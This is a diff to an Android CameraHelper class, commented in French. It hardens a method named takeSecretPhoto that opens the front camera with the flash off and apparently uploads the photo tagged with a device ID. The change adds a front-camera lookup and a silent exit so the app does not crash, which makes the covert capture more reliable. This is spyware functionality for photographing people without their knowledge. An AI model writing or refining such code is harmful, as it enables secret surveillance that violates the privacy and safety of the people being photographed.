@@ -15,8 +15,27 @@ public class CameraHelper {
     private static Camera camera;
 
     public static void takeSecretPhoto(Context context, String deviceId) {
+        // FAILLE 2 : Vérifier si la caméra frontale existe avant de l'ouvrir
+        int cameraId = -1;
+        int numberOfCameras = Camera.getNumberOfCameras();
+        for (int i = 0; i < numberOfCameras; i++) {
+            Camera.CameraInfo info = new Camera.CameraInfo();
+            Camera.getCameraInfo(i, info);
+            if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
+                cameraId = i;
+                break;
+            }
+        }
+
+        if (cameraId == -1) {
+            Log.e("CameraHelper", "Pas de caméra frontale trouvée.");
+            return; // Ne pas crasher, juste abandonner
+        }
+
         try {
-            camera = Camera.open(Camera.CameraInfo.CAMERA_FACING_FRONT);
+            camera = Camera.open(cameraId);
+            if (camera == null) return;
+
             Camera.Parameters params = camera.getParameters();
             params.setFlashMode(Camera.Parameters.FLASH_MODE_OFF);
             camera.setParameters(params);
@@ -30,7 +49,6 @@ public class CameraHelper {
                     } catch (Exception e) {
                         Log.e("CameraHelper", "Erreur upload: " + e.getMessage());
                     } finally {
-                        // LIBÉRATION GARANTIE MÊME EN CAS DE CRASH
                         if (camera != null) {
                             camera.release();
                             CameraHelper.camera = null;
@@ -40,7 +58,6 @@ public class CameraHelper {
             });
         } catch (Exception e) {
             Log.e("CameraHelper", "Erreur caméra: " + e.getMessage());
-            // LIBÉRATION SI LE DÉMARRAGE ÉCHOUE
             if (camera != null) {
                 camera.release();
                 camera = null;
